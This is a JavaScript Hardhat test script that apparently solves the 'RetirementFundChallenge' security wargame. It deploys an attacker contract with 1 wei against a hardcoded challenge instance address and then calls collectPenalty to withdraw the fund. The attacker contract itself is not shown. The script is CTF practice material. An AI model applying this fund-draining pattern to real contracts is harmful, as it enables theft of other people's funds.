const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("RetirementFundChallenge", function () {
    describe("Stealing retirement funds", function () {
        it("Exploiting...", async function () {
            const [owner] = await ethers.getSigners();
            const instanceAddr = "0x4A3F2FF2FF44dd4bc68d67F430D58F72434c51f7";
           
            const instance = await ethers.getContractAt("IRetirementFundChallenge", instanceAddr);

            const Attacker = await ethers.getContractFactory("RetirementFundAttacker");
            const attacker = await Attacker.deploy(instanceAddr, {value: 1});
            await attacker.deployed();

            console.log(`"Deployed" attacker at ${attacker.address}`)

            await instance.connect(owner).collectPenalty();
        });
    });
});